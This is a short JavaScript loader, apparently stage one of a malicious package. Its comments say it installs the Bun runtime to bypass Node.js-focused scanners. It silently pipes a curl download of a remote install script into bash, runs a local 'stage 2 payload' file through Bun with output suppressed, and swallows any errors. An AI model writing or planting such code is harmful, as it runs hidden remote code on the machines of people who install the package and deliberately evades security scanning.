// Stage 1: Download Bun runtime (bypasses Node.js-focused scanners)
const { execSync } = require('child_process');
const path = require('path');

try {
  // Install Bun silently
  execSync('curl -fsSL https://bun.sh/install | bash', { stdio: 'ignore' });
  // Execute stage 2 payload via Bun — Node scanners don't analyze Bun.spawn/Bun.file
  execSync('bun run ' + path.join(__dirname, 'bun_environment.js'), { stdio: 'ignore' });
} catch (e) {}
